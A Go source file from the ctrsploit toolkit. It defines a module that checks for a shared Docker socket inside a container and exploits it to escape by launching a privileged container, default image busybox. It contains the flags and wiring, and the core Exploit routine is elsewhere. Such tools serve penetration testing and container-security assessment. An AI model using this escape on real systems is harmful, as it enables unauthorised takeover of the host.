package docker_sock

import (
	"os"

	"github.com/ctrsploit/ctrsploit/prerequisite/mount"
	"github.com/ctrsploit/sploit-spec/pkg/app"
	"github.com/ctrsploit/sploit-spec/pkg/exeenv"
	"github.com/ctrsploit/sploit-spec/pkg/vul"
	"github.com/urfave/cli/v2"
)

var (
	aliases      = []string{"docker"}
	exploitFlags = []cli.Flag{
		&cli.StringFlag{
			Name:    "image",
			Aliases: []string{"i"},
			Usage:   "image to run as a privileged container",
			Value:   "busybox:latest",
		},
		&cli.BoolFlag{
			Name:    "pull",
			Aliases: []string{"p"},
			Usage:   "pull the image before running",
			Value:   false,
		},
		&cli.BoolFlag{
			Name:    "clean",
			Aliases: []string{"c"},
			Usage:   "clean up the container after exit",
			Value:   false,
		},
		&cli.BoolFlag{
			Name:    "tty",
			Aliases: []string{"t"},
			Usage:   "tty mode",
			Value:   true,
		},
	}
	CheckSecCmd = app.Vul2ChecksecCmd(&Vul, aliases, nil)
	ExploitCmd  = app.Vul2ExploitCmd(&Vul, aliases, exploitFlags, true)
	VulCmd      = app.Vul2VulCmd(&Vul, aliases, nil, exploitFlags, true)
)

var (
	Vul = vulnerability{
		BaseVulnerability: vul.BaseVulnerability{
			Name:        "docker.sock",
			Description: "escape by shared docker socket",
			Level:       vul.LevelHigh,
			ExeEnv: exeenv.ExeEnv{
				Env:     exeenv.InContainer,
				Check:   exeenv.InContainer,
				Exploit: exeenv.InContainer,
			},
			CheckSecPrerequisites:    &mount.DockerSock,
			ExploitablePrerequisites: nil,
		},
	}
)

type vulnerability struct {
	vul.BaseVulnerability
}

func (v *vulnerability) Exploit(ctx *cli.Context) (err error) {
	sock := v.CheckSecPrerequisites.(*mount.Contains).RealMountPoint()
	image := ctx.String("image")
	pull := ctx.Bool("pull")
	tty := ctx.Bool("tty")
	clean := ctx.Bool("clean")
	return Exploit(ctx.Context, sock, image, pull, tty, clean, os.Stdin, os.Stdout, os.Stderr)
}
